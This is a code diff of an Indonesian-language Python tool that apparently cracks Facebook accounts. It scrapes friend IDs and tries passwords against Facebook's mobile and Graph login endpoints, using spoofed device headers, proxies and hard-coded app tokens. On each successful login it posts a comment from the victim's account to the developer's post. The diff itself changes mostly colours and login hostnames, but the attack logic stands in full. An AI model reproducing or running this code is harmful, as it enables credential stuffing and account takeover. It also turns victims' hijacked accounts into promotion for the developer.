-                                print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+                                print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                         else:
                             if u in l:continue
                             elif u == self.my:continue
                             else:open(self.files,'a+').write(o)
-                        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
+                        print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
             except KeyboardInterrupt:
                 exit(self.lanjut())
             except Exception as e:
-                print('\r       %s[%s•%s] %sTeman %s%s %sTidak Publik'%(J,P,J,P,J,self.target,P), end='');sys.stdout.flush()
+                print('\r       %s[%s•%s] %sTeman %s%s %sTidak Publik'%(H,P,H,P,H,self.target,P), end='');sys.stdout.flush()
                 pass
     def lanjut(self):
-        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
-        print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
+        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(H,P,H,P,H,len(open(self.files,'r').read().splitlines()),P))
+        print('       %s[%s•%s] %sFile : %s%s %s'%(H,P,H,P,H,file_dump,P))
         system_login();pilihan_sakdurunge_crack();addpass();crack()
 
 ###----------[ LOGIN METHOD ]---------- ###
@@ -1213,8 +1210,8 @@ def system_login():
 
 ###----------[ URL LOGIN ]---------- ###
 def metode_scrap_login():
-    tamp_sistem = f"""            {O2}[{A2}1{O2}] {P2}Free FB   {O2}[{A2}2{O2}] {P2}Mbasic   {O2}[{A2}3{O2}] {P2}Mobile"""
-    printer(Panel(tamp_sistem,title=f'{O2}[ {P2}Login {O2}]',width=54,title_align='left',style='#FFFFFF'))
+    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Free FB   {J2}[{A2}2{J2}] {P2}Mbasic   {J2}[{A2}3{J2}] {P2}Mobile"""
+    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FFFF00'))
     ch = input('   %s└──> %s'%(A,J))
     if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
     elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
@@ -1222,19 +1219,19 @@ def metode_scrap_login():
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
 def metode_scrap_api():
     global sistem_login
-    tamp_sistem = f"""            {O2}[{A2}1{O2}] {P2}Api 1     {O2}[{A2}2{O2}] {P2}Api 2    {O2}[{A2}3{O2}] {P2}Graph"""
-    printer(Panel(tamp_sistem,title=f'{O2}[ {P2}Login {O2}]',width=54,title_align='left',style='#FFFFFF'))
+    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Api 1     {J2}[{A2}2{J2}] {P2}Api 2    {J2}[{A2}3{J2}] {P2}Graph"""
+    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FFFF00'))
     ch = input('   %s└──> %s'%(A,J))
-    if ch in ['1','01','a']:sistem_login = "tiga";open('tool/url_login.json','w').write("mbasic.facebook.com")
-    elif ch in ['2','02','b']:sistem_login = "empat";open('tool/url_login.json','w').write("mbasic.facebook.com")
-    elif ch in ['3','03','c']:sistem_login = "lima";open('tool/url_login.json','w').write("mbasic.facebook.com")
+    if ch in ['1','01','a']:sistem_login = "tiga";open('tool/url_login.json','w').write("m.facebook.com")
+    elif ch in ['2','02','b']:sistem_login = "empat";open('tool/url_login.json','w').write("free.facebook.com")
+    elif ch in ['3','03','c']:sistem_login = "lima";open('tool/url_login.json','w').write("www.facebook.com")
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
 
 ###----------[ URUTAN CRACK ]---------- ###
 def urut_crack():
     global urutan_crack
-    tamp_urutan = f"""            {O2}[{A2}1{O2}] {P2}ID Tua    {O2}[{A2}2{O2}] {P2}ID Muda  {O2}[{A2}3{O2}] {P2}ID Acak"""
-    printer(Panel(tamp_urutan,title=f'{O2}[ {P2}Urutan {O2}]',width=54,title_align='left',style='#FFFFFF'))
+    tamp_urutan = f"""            {J2}[{A2}1{J2}] {P2}ID Tua    {J2}[{A2}2{J2}] {P2}ID Muda  {J2}[{A2}3{J2}] {P2}ID Acak"""
+    printer(Panel(tamp_urutan,title=f'{J2}[ {P2}Urutan {J2}]',width=54,title_align='left',style='#FFFF00'))
     ch = input('   %s└──> %s'%(A,J))
     if ch in ['1','01','a']:urutan_crack = '0'
     elif ch in ['2','02','b']:urutan_crack = '1'
@@ -1317,7 +1314,7 @@ def logger1(user,pasw): #--- Login Validate ---#
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
-                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
@@ -1345,7 +1342,7 @@ def logger2(user,pasw): #--- Login Regular ---#
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
-                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
         else:
@@ -1370,7 +1367,7 @@ def logger3(user,pasw): #--- Login Api 1 ---#
         token  = open('login/token.json','r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
         with requests.Session() as xyz:
-            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
             except Exception as e:pass
             return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
@@ -1399,7 +1396,7 @@ def logger4(user,pasw): #--- Login Api 2 ---#
         token  = open('login/token.json','r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
         with requests.Session() as xyz:
-            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
             except Exception as e:pass
             return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
@@ -1428,11 +1425,11 @@ def logger5(user,pasw): #--- Login Graph FB ---#
         token  = open('login/token.json','r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
         with requests.Session() as xyz:
-            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
+            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Post_Dev),kata_dev+komentar,token),cookies=cookie).text)
             except Exception as e:pass
             return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
     else:
-        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":user,"password":pasw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bB28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":user,"password":pasw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
         headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
         if pilih_proxy == True:
             proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
